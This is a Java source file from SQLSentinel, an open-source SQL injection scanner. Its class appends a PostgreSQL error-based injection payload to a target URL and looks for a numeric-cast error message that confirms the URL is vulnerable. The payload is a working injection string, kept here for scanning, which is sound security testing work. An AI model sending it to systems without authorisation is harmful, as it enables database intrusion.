package sqlsentinel.sqlchecker;

/*

 SQLSentinel v 0.4

 Copyright (C) 2012-2013  Luca Magistrelli <blackstorm010[at]gmail[dot]com>

 This program is free software; you can redistribute it and/or
 modify it under the terms of the GNU General Public License
 as published by the Free Software Foundation; either version 2
 of the License, or (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

 */

import java.util.logging.Level;
import java.util.logging.Logger;
import sqlsentinel.core.SQLSentinelUtils;
import sqlsentinel.sqlchecker.SQLCommonCheck;
import sqlsentinel.sqlchecker.ErrorBasedTest;

public class SQLPostgresqlErrorBasedFinder implements SQLCommonCheck {
    private String url_vuln = null;
    private final String injCode = 
            "+AND+21=CAST((CHR(58)||CHR(112)||CHR(98)||CHR(115)||CHR(58))||(SELECT+(CASE+WHEN+(7088=7088)+THEN+1+ELSE+0+END))::text||(CHR(58)||CHR(108)||CHR(119)||CHR(118)||CHR(58))+AS+NUMERIC)--";
    private final String[] errorPage = {
            "invalid input syntax for type numeric:"
    };
    private ErrorBasedTest errorBT = null;
    private String url_ErrorBased_inj = null;

    public SQLPostgresqlErrorBasedFinder(String url_vuln){
        this.url_vuln = url_vuln;
    }
    
    @Override
    public boolean checkVuln() {
        try
        {
            errorBT = new ErrorBasedTest(url_vuln, injCode, errorPage);
            if(errorBT.checkErrorBasedInj()){
                this.url_ErrorBased_inj = errorBT.getErrorBasedSqlInj();
                return true;
            }
            return false;
        } catch(Exception ex){
            Logger.getLogger(SQLPostgresqlErrorBasedFinder.class.getName()).log(Level.SEVERE, null, ex);
            return false;
        }
            
    }

    @Override
    public String getSQLInjUrl() {
        return this.url_ErrorBased_inj;
    }
    
}
